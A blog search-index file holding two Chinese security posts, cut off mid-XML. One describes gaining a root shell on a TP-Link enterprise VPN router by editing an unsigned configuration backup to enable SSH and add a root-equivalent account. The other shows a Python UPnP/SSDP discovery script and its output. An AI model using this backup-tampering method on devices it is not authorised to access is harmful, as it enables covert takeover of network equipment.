<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>tplink企业vpn路由器GetShell</title>
    <link href="/article/de04eab8.html"/>
    <url>/article/de04eab8.html</url>
    
    <content type="html"><![CDATA[<p>闲鱼上淘到某款企业vpn路由器，比较早的设备。</p><p>拿到某款设备肯定要想办法拿到固件来分析，并搞到getshell来干更多好玩的东西。</p><h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>通过官方网站下载的升级固件，尝试升级。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113134757833.png" alt="image-20231113134757833"></p><p>寄！</p><p>尝试扫描端口查看是否开启ssh。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113135348552.png" alt="image-20231113135348552"></p><p>寄！</p><p>都无效，也没有查到历史漏洞，只能拆了。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/IMG_6135.JPG" alt="IMG_6135"></p><p>串口通过调试，并不能获取到任何数据，可能是给关掉了。</p><p>基本思路均失败。</p><h2 id="发现配置文件，尝试新思路"><a href="#发现配置文件，尝试新思路" class="headerlink" title="发现配置文件，尝试新思路"></a>发现配置文件，尝试新思路</h2><p>在系统工具，设备管理中发现备份设置，该品牌设备多是基于openwrt开发，所以我们将希望寄托在备份文件中。</p><p>尝试下载备份文件。</p><p>分析发现为gzip压缩文件，直接解包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113140236875.png" alt="image-20231113140236875"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113140453660.png" alt="image-20231113140453660"></p><p>发现了dropbear，passwd，shadow等文件，思路这不就来了。</p><p>首先尝试修改dropbear配置文件，将其改为开机自启。添加自定义用户，权限组为root，并设置其密码为自定义，方便dropbear打开后能正常登陆shell。</p><p>通过关键字搜索，发现dropbear配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113141235260.png" alt="image-20231113141235260"></p><p>将ssh_port_switch修改为on，使设备启动时打开ssh</p><p>并记住其端口，33400</p><p>先将其打包恢复备份，查看是否有签名校验。</p><p>成功恢复，证明没有签名校验，然后尝试ssh连接设备</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142231336.png" alt="image-20231113142231336"></p><p>成功开启ssh，下一步就是创建自定义用户，是我们能够成功登入系统</p><p>修改passwd和shadow文件</p><p>修改passwd文件，这里我创建了一个与root一样的用户pipi</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142358252.png" alt="image-20231113142358252"></p><p>在shadow中给pipi用户设置密码，这里自定义即可，也可以直接复制自己linux机器的用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142454495.png" alt="image-20231113142454495"></p><p>在次打包，将其恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113142620362.png" alt="image-20231113142620362"></p><p>成功登入，可以发现其就是一个openwrt。</p><p>cat &#x2F;proc&#x2F;cpuinfo后可以发现其设备为mips架构，使用的是高通骁龙QCA956X的一款芯片。</p><p>openwrt可玩性很高，这里不多赘述。</p><h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p>getShell之后可以尝试使用dd命令来提取固件，大概思路如下。</p><p>使用cat &#x2F;proc&#x2F;mtd来查看分区</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143147532.png" alt="image-20231113143147532"></p><p>使用dd命令来直接提取分区</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143322534.png" alt="image-20231113143322534"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20231113143411309.png" alt="image-20231113143411309"></p><p>得益于openwrt的各种命令都比较完整，可以用nc 等方式将固件下载到本地来进行分析。</p><p>以上就是通过修改备份文件的思路来GetShell。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-upnp</title>
    <link href="/article/697ff101.html"/>
    <url>/article/697ff101.html</url>
    
    <content type="html"><![CDATA[<p><strong>upnp访问过程</strong></p><p>#随笔</p><p>udp访问239.255.255.250的1900端口，ssdp协议</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> reANY = <span class="hljs-string">&quot;0.0.0.0&quot;</span>DES_IP = <span class="hljs-string">&quot;239.255.255.250&quot;</span>PORT = <span class="hljs-number">1900</span>xml_str = <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;HOST: 239.255.255.250:1900\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;MAN: &quot;ssdp:discover&quot;\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;MX: 1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;ST: urn:dial-multiscreen-org:service:dial:1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;USER-AGENT: Google Chrome/87.0.4280.88 Windows\r\n\r\n\r\n&#x27;</span>s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="hljs-number">1</span>)s.bind((ANY,PORT))s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)s.setsockopt(  socket.IPPROTO_IP,  socket.IP_ADD_MEMBERSHIP,  socket.inet_aton(DES_IP) + socket.inet_aton(ANY))s.setblocking(<span class="hljs-literal">False</span>)s.sendto(xml_str,(DES_IP,PORT))<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-keyword">try</span>:    data, address = s.recvfrom(<span class="hljs-number">2048</span>)  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    <span class="hljs-keyword">pass</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-built_in">print</span>(address)    <span class="hljs-built_in">print</span>(data)</code></pre></div><p>通过这种方式可以获取到同网下的其他upnp设备信息</p><div class="code-wrapper"><pre><code class="hljs bash">(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>, 35150)b<span class="hljs-string">&#x27;NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nCACHE-CONTROL: max-age=3600\r\nLOCATION: http://10.0.0.1:56688/rootDesc.xml\r\nSERVER: OpenWRT/OpenWrt UPnP/1.1 MiniUPnPd/2.0\r\nNT: upnp:rootdevice\r\nUSN: uuid:97fd7581-d522-415d-bfae-a51ac69e4b55::upnp:rootdevice\r\nNTS: ssdp:alive\r\nOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\r\n01-NLS: 1693189369\r\nBOOTID.UPNP.ORG: 1693189369\r\nCONFIGID.UPNP.ORG: 1337\r\n\r\n&#x27;</span>(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>, 60956)b<span class="hljs-string">&#x27;NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nCACHE-CONTROL: max-age=1801\r\nNTS: ssdp:alive\r\nLOCATION: http://10.0.0.1:49153/wps_device.xml\r\nSERVER: Unspecified, UPnP/1.0, Unspecified\r\nNT: urn:schemas-wifialliance-org:service:WFAWLANConfig:1\r\nUSN: uuid:dd20a05f-a846-47cf-b976-047083022a1d::urn:schemas-wifialliance-org:service:WFAWLANConfig:1\r\n\r\n&#x27;</span></code></pre></div><p>现在是以10.0.0.1做演示</p><p>信息中能发现LOCATION</p><p><a href="http://10.0.0.1:49153/wps_device.xml"><em>http://10.0.0.1:49153/wps_device.xml</em></a></p><p><a href="http://10.0.0.1:56688/rootDesc.xml"><em>http://10.0.0.1:56688/rootDesc.xml</em></a></p><p>rootDesc.xml文件</p><p>This XML file does not appear to have any style information associated with it. The document tree is shown below.</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>  <span class="hljs-attr">configId</span>=<span class="hljs-string">&quot;1337&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:InternetGatewayDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>RAX40 (Gateway)<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>Netgear, Inc.<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://www.NETGEAR.com<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>OpenWRT router<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>RAX40<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>RAX40<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://www.netgear.com/home<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b55<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Layer3Forwarding:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:L3Forwarding1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/L3F.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">deviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:WANDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>WANDevice<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>MiniUPnP<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>WAN Device<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>WAN Device<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>20220318<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b56<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">UPC</span>&gt;</span>000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">UPC</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANCommonIFC1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANCfg.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​          <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">deviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:WANConnectionDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>WANConnectionDevice<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>MiniUPnP<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>MiniUPnP daemon<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>MiniUPnPd<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>20220318<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b57<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">UPC</span>&gt;</span>000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">UPC</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​              <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANIPConnection:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANIPConn1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANIPCn.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​              <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​            <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">deviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">deviceList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">presentationURL</span>&gt;</span>http://www.routerlogin.net<span class="hljs-tag">&lt;/<span class="hljs-name">presentationURL</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></code></pre></div><p>其中可以获取设备名称制造商各种服务等信息</p><p>L3Forwarding1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Layer3Forwarding:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:L3Forwarding1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/L3F.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>WANCommonIFC1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANCommonIFC1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANCfg.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>WANIPConn1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANIPConnection:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANIPConn1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANIPCn.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>通过访问SCPDURL可以获取服务的具体行为，以WANIPConn1为例</p><p>访问<a href="http://10.0.0.1:56688/WANIPCn.xml">http://10.0.0.1:56688/WANIPCn.xml</a></p><div class="code-wrapper"><pre><code class="hljs xml">This XML file does not appear to have any style information associated with it. The document tree isshown below.<span class="hljs-tag">&lt;<span class="hljs-name">scpd</span>  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service-1-0&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">actionList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>SetConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetConnectionTypeInfo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RequestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ForceTermination<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetStatusInfo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>LastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewUptime<span 